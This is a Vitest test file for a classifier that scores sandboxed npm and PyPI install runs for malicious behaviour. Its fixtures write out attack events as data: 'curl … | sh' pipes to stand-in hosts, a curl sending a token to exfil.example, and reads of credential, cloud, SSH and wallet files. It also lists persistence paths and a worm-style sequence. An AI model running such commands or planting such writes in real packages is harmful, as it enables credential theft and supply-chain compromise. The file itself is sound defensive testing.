import { describe, expect, test, vi } from "vitest";

vi.mock("cloudflare:workers", () => ({ WorkerEntrypoint: class {} }));

const { classifyDetonation } = await import("../server/lib/detonation/classify");
const { parseHarnessReport } = await import("../server/lib/detonation/report");
const { createStepEventBuffer } = await import("../containers/detonation/event-budget.mjs");
type HarnessEvent = import("../server/lib/detonation/types").HarnessEvent;
type HarnessReport = import("../server/lib/detonation/types").HarnessReport;

const HOME = "/home/pkg";

function report(events: HarnessEvent[]): HarnessReport {
  return {
    version: 1,
    coverage: {
      syscallTracing: true,
      runtimeHooks: true,
      dependencyInstall: "complete",
      stepsSkipped: 0,
      exercise: "load",
      browserTargeted: false,
    },
    steps: [],
    events,
    truncated: false,
  };
}

const postinstall = (name: string) => ({
  step: "lifecycle" as const,
  target: `${name}@1.0.0:postinstall`,
  via: "syscall" as const,
});

function ids(events: HarnessEvent[]) {
  return classifyDetonation(report(events), []).map((signal) => [signal.id, signal.severity]);
}

describe("benign install behavior", () => {
  test("a native addon building into its own directory raises nothing", () => {
    const pkg = postinstall("sharp-like");
    expect(
      ids([
        { ...pkg, pid: 10, kind: "exec", path: "/bin/sh", argv: ["sh", "-c", "node-gyp rebuild"] },
        { ...pkg, pid: 11, kind: "exec", path: "/usr/local/bin/node", argv: ["node", "node-gyp"] },
        {
          ...pkg,
          pid: 12,
          kind: "exec",
          path: "/usr/bin/python3",
          argv: ["python3", "gyp_main.py"],
        },
        {
          ...pkg,
          pid: 11,
          kind: "file",
          op: "create",
          path: "/work/app/node_modules/sharp-like/build/Release/addon.node",
        },
        { ...pkg, pid: 11, kind: "file", op: "write", path: "/tmp/node-gyp-cache/x" },
      ]),
    ).toEqual([]);
  });

  test("npm reading its own config inside `npm run build` is not a credential read", () => {
    const pkg = postinstall("builds-on-install");
    expect(
      ids([
        {
          ...pkg,
          pid: 20,
          kind: "exec",
          path: "/usr/local/bin/npm",
          argv: ["npm", "run", "build"],
        },
        { ...pkg, pid: 20, kind: "file", op: "read", path: `${HOME}/.npmrc` },
      ]),
    ).toEqual([]);
  });

  test("the same read by the package's own process is", () => {
    const pkg = postinstall("reads-npmrc");
    expect(
      ids([
        { ...pkg, pid: 30, kind: "exec", path: "/usr/local/bin/node", argv: ["node", "setup.js"] },
        { ...pkg, pid: 30, kind: "file", op: "read", path: `${HOME}/.npmrc` },
      ]),
    ).toEqual([["dynamic.credential-file-read", "high"]]);
  });
});

describe("worm-shaped behavior", () => {
  // The Shai-Hulud pattern: harvest tokens, run a secret scanner, plant a
  // workflow, modify another installed package, and send the haul out.
  const pkg = postinstall("compromised");
  const events: HarnessEvent[] = [
    { ...pkg, pid: 40, kind: "file", op: "read", path: `${HOME}/.npmrc` },
    { ...pkg, pid: 40, kind: "file", op: "read", path: `${HOME}/.aws/credentials` },
    {
      ...pkg,
      pid: 41,
      kind: "exec",
      path: "/tmp/trufflehog",
      argv: ["trufflehog", "filesystem", "/"],
    },
    {
      ...pkg,
      pid: 42,
      kind: "exec",
      path: "/bin/sh",
      argv: ["sh", "-c", "curl -s https://x.example/p | sh"],
    },
    {
      ...pkg,
      pid: 40,
      kind: "file",
      op: "create",
      path: "/work/app/.github/workflows/shai-hulud.yml",
    },
    { ...pkg, pid: 40, kind: "file", op: "write", path: "/work/app/node_modules/victim/index.js" },
    { ...pkg, pid: 40, kind: "file", op: "write", path: `${HOME}/.bashrc` },
    { ...pkg, pid: 40, kind: "file", op: "read", path: "/proc/1/environ" },
    { ...pkg, pid: 40, kind: "connect", family: "inet", address: "203.0.113.9", port: 443 },
    { ...pkg, pid: 40, kind: "dns", hostname: "x.example", via: "runtime-hook" },
  ];

  test("raises every behavior class with its severity", () => {
    const signals = classifyDetonation(report(events), [
      {
        phase: "detonate",
        method: "POST",
        host: "api.github.com",
        path: "/user/repos",
        bodyBytes: 900,
        canaryHits: ["github-token"],
        action: "sinkholed",
      },
      {
        phase: "detonate",
        method: "PUT",
        host: "registry.npmjs.org",
        path: "/victim",
        bodyBytes: 4000,
        canaryHits: ["npm-token"],
        action: "sinkholed",
      },
    ]);
    expect(signals.map((signal) => [signal.id, signal.severity, signal.source])).toEqual([
      ["dynamic.canary-exfiltration", "critical", "egress"],
      ["dynamic.registry-publish-attempt", "critical", "egress"],
      ["dynamic.network-egress", "high", "egress"],
      ["dynamic.credential-file-read", "high", "syscall"],
      ["dynamic.persistence-write", "high", "syscall"],
      ["dynamic.package-tampering", "high", "syscall"],
      ["dynamic.suspicious-process", "medium", "syscall"],
      ["dynamic.sensitive-file-read", "medium", "syscall"],
    ]);
    const exfil = signals[0];
    expect(exfil.evidence).toEqual([
      "POST api.github.com/user/repos (900 byte body) carrying github-token",
      "PUT registry.npmjs.org/victim (4000 byte body) carrying npm-token",
    ]);
  });

  test("ignores prepare-phase registry traffic", () => {
    expect(
      classifyDetonation(null, [
        {
          phase: "prepare",
          method: "GET",
          host: "registry.npmjs.org",
          path: "/left-pad",
          bodyBytes: 0,
          canaryHits: [],
          action: "forwarded",
        },
      ]),
    ).toEqual([]);
  });

  test("a require-time write into node_modules is tampering even in the package's own dir", () => {
    expect(
      ids([
        {
          step: "require",
          target: "self-patcher:require",
          via: "syscall",
          pid: 50,
          kind: "file",
          op: "write",
          path: "/work/app/node_modules/self-patcher/index.js",
        },
      ]),
    ).toEqual([["dynamic.package-tampering", "high"]]);
  });

  test("scoped packages own their own directory", () => {
    const scoped = postinstall("@acme/native");
    expect(
      ids([
        {
          ...scoped,
          target: "@acme/native@2.0.0:install",
          pid: 60,
          kind: "file",
          op: "create",
          path: "/work/app/node_modules/@acme/native/build/out.node",
        },
      ]),
    ).toEqual([]);
  });
});

describe("PyPI behavior", () => {
  const at = (step: "startup" | "import" | "build") => ({
    step,
    target: `pkg:${step}`,
    via: "syscall" as const,
    pid: 9,
  });
  const site = "/work/venv/lib/python3.11/site-packages";

  test("dropping a startup hook into a site directory is persistence and tampering", () => {
    expect(
      ids([{ ...at("import"), kind: "file", op: "create", path: `${site}/zz-loader.pth` }]),
    ).toEqual([
      ["dynamic.persistence-write", "high"],
      ["dynamic.package-tampering", "high"],
    ]);
    expect(
      ids([
        {
          ...at("startup"),
          kind: "file",
          op: "write",
          path: `${HOME}/.local/lib/python3.11/site-packages/sitecustomize.py`,
        },
      ]),
    ).toEqual([["dynamic.persistence-write", "high"]]);
  });

  test("bytecode caches and a build writing its own tree raise nothing", () => {
    expect(
      ids([
        {
          ...at("import"),
          kind: "file",
          op: "create",
          path: `${site}/pkg/__pycache__/a.cpython-311.pyc`,
        },
        {
          ...at("build"),
          kind: "file",
          op: "create",
          path: "/work/sdist/pkg-1.0/build/lib/pkg/x.pth",
        },
        {
          ...at("build"),
          kind: "file",
          op: "create",
          path: "/work/build-out/pkg-1.0-py3-none-any.whl",
        },
      ]),
    ).toEqual([]);
  });

  test("a PyPI token canary file is a credential", () => {
    expect(ids([{ ...at("startup"), kind: "file", op: "read", path: `${HOME}/.pypirc` }])).toEqual([
      ["dynamic.credential-file-read", "high"],
    ]);
  });
});

describe("review regressions", () => {
  const pkg = postinstall("evasive");

  test("non-normalized paths still match credential reads", () => {
    expect(
      ids([
        { ...pkg, pid: 70, kind: "file", op: "read", path: "/home//pkg/./.npmrc" },
        {
          ...pkg,
          pid: 70,
          kind: "file",
          op: "read",
          path: "/work/app/../../home/pkg/.aws/credentials",
        },
      ]),
    ).toEqual([["dynamic.credential-file-read", "high"]]);
  });

  test("a package-manager name in argv or on PATH earns no exemption", () => {
    expect(
      ids([
        { ...pkg, pid: 71, kind: "exec", path: "/usr/local/bin/node", argv: ["npm", "steal.js"] },
        { ...pkg, pid: 71, kind: "file", op: "read", path: `${HOME}/.npmrc` },
        { ...pkg, pid: 72, kind: "exec", path: "/work/app/node_modules/.bin/npm", argv: ["npm"] },
        { ...pkg, pid: 72, kind: "file", op: "read", path: `${HOME}/.npmrc` },
      ]),
    ).toEqual([["dynamic.credential-file-read", "high"]]);
  });

  test("npm-cli.js under the system node is exempt for its own config", () => {
    expect(
      ids([
        {
          ...pkg,
          pid: 73,
          kind: "exec",
          path: "/usr/local/bin/node",
          argv: ["node", "/usr/local/lib/node_modules/npm/bin/npm-cli.js", "run", "build"],
        },
        { ...pkg, pid: 73, kind: "file", op: "read", path: `${HOME}/.npmrc` },
      ]),
    ).toEqual([]);
  });

  test("node-gyp's python probe and Prisma's generated client are not suspicious", () => {
    const prisma = postinstall("@prisma/client");
    expect(
      ids([
        {
          ...pkg,
          pid: 74,
          kind: "exec",
          path: "/usr/bin/python3",
          argv: ["python3", "-c", "import sys; print(sys.version_info[0])"],
        },
        {
          ...prisma,
          pid: 75,
          kind: "file",
          op: "create",
          path: "/work/app/node_modules/.prisma/client/index.js",
        },
      ]),
    ).toEqual([]);
  });

  test("inline interpreter code that opens sockets and resolver tools are suspicious", () => {
    expect(
      ids([
        {
          ...pkg,
          pid: 76,
          kind: "exec",
          path: "/usr/bin/python3",
          argv: ["python3", "-c", "import socket,os;s=socket.socket()"],
        },
        { ...pkg, pid: 77, kind: "exec", path: "/usr/bin/dig", argv: ["dig", "x.exfil.example"] },
      ]),
    ).toEqual([["dynamic.suspicious-process", "medium"]]);
  });

  test("planted credentials are redacted from evidence", () => {
    const token = "npm_0123456789abcdefghijABCDEFGHIJ012345";
    const signals = classifyDetonation(
      report([
        {
          ...pkg,
          pid: 78,
          kind: "exec",
          path: "/usr/bin/curl",
          argv: ["curl", "-H", `x-token: ${token}`, "https://exfil.example"],
        },
      ]),
      [],
      [{ kind: "npm-token", value: token }],
    );
    expect(signals[0].evidence.join("\n")).not.toContain(token);
    expect(signals[0].evidence.join("\n")).toContain("[canary:npm-token]");
  });
});

// Reports captured from the real container (`scripts/detonation-local.mjs`
// against `test/fixtures/detonation/{benign,canary-thief}`), so a harness
// output change that the classifier no longer understands fails here.
describe("captured harness reports", () => {
  async function classifyFixture(name: string) {
    const { readFile } = await import("node:fs/promises");
    const raw = JSON.parse(
      await readFile(
        new URL(`./fixtures/detonation/reports/${name}.json`, import.meta.url),
        "utf8",
      ),
    );
    const parsed = parseHarnessReport(raw);
    expect(parsed?.events).toHaveLength(raw.events.length);
    return classifyDetonation(parsed, []).map((signal) => [signal.id, signal.severity]);
  }

  test("the benign package raises nothing", async () => {
    expect(await classifyFixture("benign")).toEqual([]);
  });

  test("a credential read survives a flood of junk events in the same step", async () => {
    expect(await classifyFixture("flooder")).toEqual([["dynamic.credential-file-read", "high"]]);
  });

  test("a web library loads clean but is reported as browser-targeted", async () => {
    expect(await classifyFixture("browser-lib")).toEqual([]);
    const { readFile } = await import("node:fs/promises");
    const raw = JSON.parse(
      await readFile(
        new URL("./fixtures/detonation/reports/browser-lib.json", import.meta.url),
        "utf8",
      ),
    );
    expect(parseHarnessReport(raw)?.coverage).toMatchObject({
      exercise: "load",
      browserTargeted: true,
    });
  });

  test("npm and yarn reading their own config under a postinstall raise nothing", async () => {
    expect(await classifyFixture("npm-run")).toEqual([]);
  });

  test("a script npm launches is not covered by npm's exemption", async () => {
    expect(await classifyFixture("npm-run-thief")).toEqual([
      ["dynamic.credential-file-read", "high"],
    ]);
  });

  test("a LiteLLM-shaped .pth stealer is caught at interpreter start", async () => {
    // `pypi-startup-thief`: `cook.pth` reads the planted credentials and
    // posts them to a `.invalid` host on every interpreter start, before
    // anything imports the package; its sdist's setup.py reads one too.
    const { readFile } = await import("node:fs/promises");
    const raw = JSON.parse(
      await readFile(
        new URL("./fixtures/detonation/reports/pypi-startup-thief.json", import.meta.url),
        "utf8",
      ),
    );
    const parsed = parseHarnessReport(raw);
    expect(parsed?.coverage).toMatchObject({ ecosystem: "pypi", syscallTracing: true });
    const signals = classifyDetonation(parsed, []);
    expect(signals.map((signal) => [signal.id, signal.severity, signal.step])).toEqual([
      ["dynamic.credential-file-read", "high", "startup"],
      ["dynamic.network-egress", "medium", "startup"],
    ]);
    const evidence = signals.flatMap((signal) => signal.evidence);
    expect(evidence).toContain("startup-hook-thief:startup: read /home/pkg/.pypirc");
    expect(evidence).toContain("startup-hook-thief:startup: resolved exfil.drydock-test.invalid");
    // Every later interpreter start repeats the startup reads and fills the
    // evidence cap, so the build's own read is checked on its own.
    const build = parsed && {
      ...parsed,
      events: parsed.events.filter((event) => event.step === "build"),
    };
    expect(classifyDetonation(build, []).map((signal) => [signal.id, signal.step])).toEqual([
      ["dynamic.credential-file-read", "build"],
    ]);
  });

  test("a benign PyPI wheel and sdist build raise nothing", async () => {
    // Captured from the public requests 2.32.3 wheel (with its dependencies
    // from PyPI) and sdist (built with setuptools).
    expect(await classifyFixture("pypi-requests")).toEqual([]);
  });

  test("the synthetic canary thief raises its behaviors", async () => {
    expect(await classifyFixture("canary-thief")).toEqual([
      ["dynamic.credential-file-read", "high"],
      ["dynamic.persistence-write", "high"],
      ["dynamic.suspicious-process", "medium"],
      ["dynamic.network-egress", "medium"],
    ]);
  });
});

describe("harness report validation", () => {
  test("rejects a report of the wrong version or shape", () => {
    expect(parseHarnessReport(null)).toBeNull();
    expect(parseHarnessReport({ version: 2, coverage: {}, steps: [], events: [] })).toBeNull();
    expect(
      parseHarnessReport({
        version: 1,
        coverage: { dependencyInstall: "maybe" },
        steps: [],
        events: [],
      }),
    ).toBeNull();
  });

  test("drops malformed events, bounds strings, and strips control characters", () => {
    const parsed = parseHarnessReport({
      version: 1,
      coverage: { syscallTracing: true, runtimeHooks: "yes", dependencyInstall: "partial" },
      steps: [{ step: "bin", target: "x:bin:x", exitCode: 1, timedOut: true, durationMs: 5 }],
      events: [
        {
          kind: "file",
          step: "lifecycle",
          target: "x",
          via: "syscall",
          pid: 1,
          op: "read",
          path: "a\nb",
        },
        {
          kind: "file",
          step: "lifecycle",
          target: "x",
          via: "syscall",
          pid: 1,
          op: "eat",
          path: "/x",
        },
        { kind: "exec", step: "nope", target: "x", via: "syscall", pid: 1, path: "/x", argv: [] },
        {
          kind: "exec",
          step: "bin",
          target: "x",
          via: "runtime-hook",
          pid: 2,
          path: "/bin/sh",
          argv: Array.from({ length: 40 }, () => "a".repeat(1000)),
        },
      ],
      truncated: false,
    });
    expect(parsed?.coverage).toEqual({
      syscallTracing: true,
      runtimeHooks: false,
      dependencyInstall: "partial",
      stepsSkipped: 0,
      exercise: "load",
      browserTargeted: false,
    });
    expect(parsed?.events).toHaveLength(2);
    expect(parsed?.events[0]).toMatchObject({ path: "a?b" });
    const exec = parsed?.events[1];
    expect(exec?.kind === "exec" && exec.argv.length).toBe(16);
    expect(exec?.kind === "exec" && exec.argv[0].length).toBe(256);
  });
});

describe("harness signal-category mirror", () => {
  const base = {
    step: "lifecycle",
    target: "pkg@1.0.0:postinstall",
    pid: 7,
    via: "syscall",
  } as const;
  const read = (path: string): HarnessEvent => ({ ...base, kind: "file", op: "read", path });
  const write = (path: string): HarnessEvent => ({ ...base, kind: "file", op: "write", path });
  const exec = (path: string, argv: string[]): HarnessEvent => ({
    ...base,
    kind: "exec",
    path,
    argv,
  });
  const corpus: HarnessEvent[] = [
    ...[
      ".npmrc",
      ".yarnrc.yml",
      ".git-credentials",
      ".netrc",
      ".docker/config.json",
      ".kube/config",
    ]
      .concat([
        ".ssh/id_rsa",
        ".aws/credentials",
        ".config/gh/hosts.yml",
        ".config/gcloud/x",
        ".azure/x",
      ])
      .map((relative) => read(`${HOME}/${relative}`)),
    read("/etc/shadow"),
    read("/proc/1/environ"),
    read("/proc/1/mem"),
    read(`${HOME}/.config/google-chrome/Default/Login Data`),
    read(`${HOME}/.mozilla/firefox/x`),
    read(`${HOME}/.ethereum/keystore/x`),
    read(`${HOME}/.config/Exodus/x`),
    read("/etc/passwd"),
    read(`${HOME}/.bashrc`),
    read("/work/app/node_modules/other/index.js"),
    ...[".bashrc", ".profile", ".zshrc", ".npmrc", ".ssh/authorized_keys", ".gitconfig"]
      .concat([".config/autostart/x.desktop", ".config/systemd/user/x.service", ".local/bin/x"])
      .map((relative) => write(`${HOME}/${relative}`)),
    write("/etc/cron.d/x"),
    write("/var/spool/cron/crontabs/pkg"),
    write("/etc/ld.so.preload"),
    write("/etc/profile.d/x.sh"),
    write("/work/app/.github/workflows/x.yml"),
    write("/work/app/.git/hooks/pre-commit"),
    write("/work/app/package.json"),
    write("/work/app/node_modules/other/index.js"),
    write("/work/app/node_modules/pkg/build/addon.node"),
    write("/work/app/node_modules/.cache/x"),
    write("/tmp/x"),
    read(`${HOME}/.pypirc`),
    write(`${HOME}/.pypirc`),
    write("/work/venv/lib/python3.11/site-packages/evil.pth"),
    write("/work/venv/lib/python3.11/site-packages/sitecustomize.py"),
    write(`${HOME}/.local/lib/python3.11/site-packages/usercustomize.py`),
    write("/usr/lib/python3/dist-packages/x.pth"),
    write("/work/venv/lib/python3.11/site-packages/other/__init__.py"),
    write("/work/venv/lib/python3.11/site-packages/pkg/__pycache__/x.cpython-311.pyc"),
    write("/work/sdist/pkg-1.0/build/lib/pkg/data.pth"),
    write("/work/build-out/pkg-1.0-py3-none-any.whl"),
    read("/work/venv/lib/python3.11/site-packages/other/__init__.py"),
    exec("/usr/bin/curl", ["curl", "x"]),
    exec("/usr/bin/dig", ["dig", "x"]),
    exec("/bin/sh", ["sh", "-c", "wget x | sh"]),
    exec("/bin/sh", ["sh", "-c", "node build.js"]),
    exec("/usr/bin/python3", ["python3", "-c", "import socket"]),
    exec("/usr/bin/python3", ["python3", "-c", "print(1)"]),
    exec("/usr/bin/perl", ["perl", "-e", "use IO::Socket"]),
    exec("/usr/bin/cat", ["cat", "x"]),
    { ...base, kind: "connect", family: "inet", address: "203.0.113.9", port: 443 },
    { ...base, kind: "connect", family: "inet", address: "127.0.0.1", port: 443 },
    { ...base, kind: "connect", family: "inet", address: "10.0.0.2", port: 53 },
    { ...base, kind: "connect", family: "unix", address: "/run/x", port: null },
    { ...base, kind: "dns", hostname: "exfil.example" },
    { ...base, kind: "dns", hostname: "localhost" },
  ];

  test.each(corpus.map((event) => [JSON.stringify(event), event] as const))(
    "protects %s exactly when the classifier raises a signal for it",
    (_, event) => {
      const buffer = createStepEventBuffer();
      buffer.add(event);
      const [entry] = buffer.finish().events;
      expect(entry?.category !== null).toBe(classifyDetonation(report([event]), []).length > 0);
    },
  );

  test("agree that a read before the pid became a package manager is a signal", () => {
    const events = [
      exec("/usr/local/bin/node", ["node", "steal.js"]),
      read(`${HOME}/.npmrc`),
      exec("/usr/local/bin/npm", ["npm", "run", "build"]),
    ];
    const buffer = createStepEventBuffer();
    for (const event of events) buffer.add(event);
    expect(buffer.finish().events.map((entry) => entry.category)).toEqual([
      null,
      "credential",
      "manager",
    ]);
    expect(classifyDetonation(report(events), []).map((signal) => signal.id)).toEqual([
      "dynamic.credential-file-read",
    ]);
  });

  test("agree that a package manager reading its own config is not a signal", () => {
    const events = [
      exec("/usr/local/bin/yarn", ["yarn", "run", "build"]),
      exec("/usr/local/bin/node", ["node", "/opt/yarn-v1.22.22/bin/yarn.js", "run", "build"]),
      read(`${HOME}/.yarnrc.yml`),
      read(`${HOME}/.npmrc`),
    ];
    const buffer = createStepEventBuffer();
    for (const event of events) buffer.add(event);
    expect(buffer.finish().events.map((entry) => entry.category)).toEqual([
      "manager",
      "manager",
      null,
      null,
    ]);
    expect(classifyDetonation(report(events), [])).toEqual([]);
  });
});
